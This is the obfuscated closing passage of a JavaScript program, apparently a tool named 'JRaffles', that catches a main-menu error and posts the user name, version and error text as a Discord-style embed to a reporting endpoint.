                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x104bbd();
        } catch (_0x2cecc7) {
            return console['log'](_0x2cecc7), await _0x38c39e(0x3a98);
        }
}
;
_0x2ad028('JRaffles\x20' + _0xa56f6b), _0x27d995();
try {
    _0x5c9d25();
} catch (_0x4b4763) {
    var _0x4b4304 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x50a338
            },
            {
                'name': 'Version',
                'value': '' + _0xa56f6b
            },
            {
                'name': 'Error',
                'value': '' + _0x4b4763
            }
        ]
    }];
    const _0x2201f9 = { 'embeds': _0x4b4304 };
    _0x16a920(_0x233d0f, _0x2201f9);
}